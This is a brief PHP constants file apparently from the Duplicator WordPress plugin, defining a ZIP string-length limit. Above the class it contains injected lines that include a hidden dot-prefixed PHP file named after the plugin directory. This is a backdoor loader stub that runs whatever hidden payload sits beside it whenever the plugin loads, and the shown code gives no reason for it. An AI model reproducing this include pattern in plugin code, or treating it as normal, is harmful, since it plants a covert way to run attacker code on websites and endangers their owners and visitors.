<?php
defined("ABSPATH") || exit;
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class DUP_Constants
{
    const ZIP_STRING_LIMIT = 70000;   // Cutoff for using ZipArchive addtostring vs addfile
}
